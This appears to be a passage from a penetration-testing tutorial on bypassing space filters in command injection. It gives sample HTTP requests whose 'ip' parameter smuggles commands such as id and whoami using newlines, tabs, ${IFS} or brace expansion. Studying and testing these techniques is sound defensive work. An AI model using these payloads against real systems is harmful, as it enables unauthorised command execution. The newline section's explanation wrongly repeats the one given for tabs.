A commonly blacklisted character is a space ( ) or `+` when its encoded. There are a couple of ways to bypass such filters for this characters.
## Using New-line
Using newline (`%0d%0a`) instead of spaces is a technique that might work, since both Linux and Windows accept commands with tabs in between arguments, and they are executed the same.
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0aid
```
## Using Tabs
Using tabs (`%09`) instead of spaces is a technique that might work, since both Linux and Windows accept commands with tabs in between arguments, and they are executed the same.
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%09whoami
```
## Using $IFS
The `$IFS` is a Linux Environment Variable that can used since its default value is a space and a tab, which would work between command arguments. So if the `$IFS` is used, the variable should automatically be replaced by a space and the command should work.
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1${IFS}whoami
```
> Note: When parsed, this will translate into the CLI `127.0.0.1$IFSwhoami`.
## Using Brace Expansion
The Bash Brace Expansion feature (`{ls,-la}`) automatically ads spaces between arguments wrapped in braces. We can also utilize this same method to bypass space filters.
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0a{id,whoami}
```